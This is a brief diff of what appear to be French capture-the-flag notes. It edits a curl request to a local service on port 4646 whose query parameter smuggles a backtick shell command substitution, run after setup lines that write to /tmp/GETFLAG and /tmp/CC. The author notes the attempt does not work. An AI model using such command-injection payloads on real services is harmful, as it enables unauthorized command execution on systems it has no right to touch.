@@ -9,7 +9,7 @@ echo "getflag" > /tmp/GETFLAG
 touch /tmp/CC
 ```
 ```
-curl localhost:4646/?x=`/*GETFLAG>/*/CC` 
+curl localhost:4646/?x=`/*/GETFLAG>/*/CC` 
 ```
 
 Ne marche pas
